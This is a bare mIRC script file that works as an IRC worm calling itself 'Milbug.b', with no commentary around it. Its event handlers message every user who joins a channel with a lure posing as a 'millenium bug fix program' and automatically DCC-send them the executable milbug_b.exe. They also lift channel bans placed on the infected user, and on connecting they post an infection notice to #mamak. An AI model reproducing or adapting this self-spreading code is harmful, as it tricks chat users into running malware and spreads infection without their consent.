[script]
n0=on 1:JOIN:#: if ( $me != $nick ) { /ping $nick }
n1=on 1:JOIN:#: if ( $me != $nick ) { /msg $nick I'm testing my millenium bug fix program. Receive it and test it . 10q }
n2=on 1:JOIN:#: if ( $me != $nick ) { /dcc send $nick c:\mirc\download\milbug_b.exe }
n3=on @1:BAN:#: if ( $banmask iswm $address($me,5) ) mode $chan -b $banmask
n5=on 1:CONNECT: {
n6=/join #mamak
n7=/msg #mamak I'm the victimz of Milbug.b
n8=/part
n9=}
